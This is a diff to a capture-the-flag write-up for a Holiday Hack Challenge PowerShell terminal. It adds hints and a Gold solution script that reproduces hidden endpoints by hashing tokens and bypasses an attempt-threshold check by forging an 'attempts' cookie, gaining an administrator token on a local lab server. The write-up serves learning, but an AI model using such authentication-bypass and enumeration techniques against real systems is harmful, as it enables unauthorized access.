@@ -5,6 +5,11 @@ draft = false
 weight = 3
 +++
 
+## Objecetive
+
+> Team Wombley is developing snow weapons in preparation for conflict, but they've been locked out by their own defenses. Help Piney with regaining access to the weapon operations terminal.
+
+## Solution
 
 ### Silver
 
@@ -472,4 +477,97 @@ Correct Token supplied, you are granted access to the snow cannon terminal. Here
 > Once HHC grants your achievement, you can close this terminal.
 
 ![Powershell silver final](/images/act2/powershell-1.png)
+
+### Gold
+
+#### Hints
+
+> PowerShell Admin Access - Fakeout EDR Threshold
+> From:
+> Terminal: PowerShell
+> They also mentioned this lazy elf who programmed the security settings in the weapons terminal. He created a fakeout protocol that he dubbed Elf Detection and > Response "EDR". The whole system is literally that you set a threshold and after that many attempts, the response is passed through... I can't believe it. He > supposedly implemented it wrong so the threshold cookie is highly likely shared between endpoints!
+
+> PowerShell Admin Access - Total Control
+> From:
+> Terminal: PowerShell
+> I overheard some of the other elves talking. Even though the endpoints have been redacted, they are still operational. This means that you can probably elevate your access by communicating with them. I suggest working out the hashing scheme to reproduce the redacted endpoints. Luckily one of them is still active and can be tested against. Try hashing the token with SHA256 and see if you can reliably reproduce the endpoint. This might help, pipe the tokens to Get-FileHash -Algorithm SHA256.
+
+#### Solution
+
+From the hint it we know that there is an EDR in place that reacts on number of attempts trid. The hint also hints at if there's more attempts than an unknown threshold, the attempts just passed through. Looking at the other hint, I figured out I have to try to see if there are some other endpoints available too. So, to solve Gold, I had a sitdown with myself to refactor my previous code by taking basis in solution 7 and 10 above and create something new. Ended up with this: 
+
+```powershell
+# Define base URL and credentials
+$baseUrl = "http://127.0.0.1:1225"
+$username = "admin"
+$password = "admin"
+
+# Create a secure credential object
+$credential = New-Object System.Management.Automation.PSCredential($username, (ConvertTo-SecureString $password -AsPlainText -Force))
+
+# Download CSV file
+try {
+    $csvResponse = Invoke-WebRequest -Uri "$baseUrl/token_overview.csv" -Credential $credential -AllowUnencryptedAuthentication -UseBasicParsing
+    $csvResponse.Content > tokens.csv
+} catch {
+    Write-Error "Failed to download CSV: $_"
+    exit
+}
+
+# Parse CSV
+try {
+    $csvData = Import-Csv -Path "tokens.csv"
+} catch {
+    Write-Error "Failed to parse CSV: $_"
+    exit
+}
+
+# Process each row
+foreach ($row in $csvData) {
+    try {
+        # Access MD5 hash from the row
+        $md5Sum = $row.file_MD5hash
+
+        # Compute SHA256 hash using a temporary file
+        $tempFile = New-TemporaryFile
+        $md5Sum | Out-File -FilePath $tempFile.FullName -Encoding ASCII
+        $sha256Sum = (Get-FileHash -Path $tempFile.FullName -Algorithm SHA256).Hash.Trim()
+        Remove-Item -Path $tempFile.FullName -Force
+
+        # Fetch MFA token
+        $mfaResponse = Invoke-WebRequest -Uri "$baseUrl/tokens/$sha256Sum" -Credential $credential -AllowUnencryptedAuthentication -Headers @{
+            Cookie = "token=$md5Sum"
+        } -UseBasicParsing
+
+        # Extract MFA token
+        if ($mfaResponse.Content -match "href='([^']+)'") {
+            $mfaToken = $matches[1]
+        } else {
+            continue
+        }
+
+        # Validate MFA with mfa_token included
+        $validationResponse = Invoke-WebRequest -Uri "$baseUrl/mfa_validate/$sha256Sum" -Credential $credential -AllowUnencryptedAuthentication -Headers @{
+            Cookie = "token=$md5Sum; mfa_token=$mfaToken; attempts=11111111111111111111111111111111111111111111111"
+        } -UseBasicParsing
+
+        # Check if the response contains "ERROR: Access Denied" and suppress it
+        if ($validationResponse.Content -notmatch "ERROR: Access Denied") {
+            Write-Output "Validation Response for $md5Sum : $($validationResponse.Content)"
+        }
+
+    } catch {
+        Write-Error "An error occurred while processing MD5 hash $($row.file_MD5hash): $_"
+        continue
+    }
+}
+```
+
+Along the way I stumbled over a cookie named "attempts", which I just sat to a redicilous high value. The script output this: 
+Output
+
+```bash
+Validation Response for 45ffb41c4e458d08a8b08beeec2b4652 : <h1>[+] Success, defense mechanisms deactivated.</h1><br>Administrator Token supplied, You are able to control the production and deployment of the snow cannons. May the best elves win: WombleysProductionLineShallPrevail</p>
+Validation Response for 5f8dd236f862f4507835b0e418907ffc : <h1>[+] Success</h1><br><p>Q29ycmVjdCBUb2tlbiBzdXBwbGllZCwgeW91IGFyZSBncmFudGVkIGFjY2VzcyB0byB0aGUgc25vdyBjYW5ub24gdGVybWluYWwuIEhlcmUgaXMgeW91ciBwZXJzb25hbCBwYXNzd29yZCBmb3IgYWNjZXNzOiBTbm93TGVvcGFyZDJSZWFkeUZvckFjdGlvbg==
+```
 
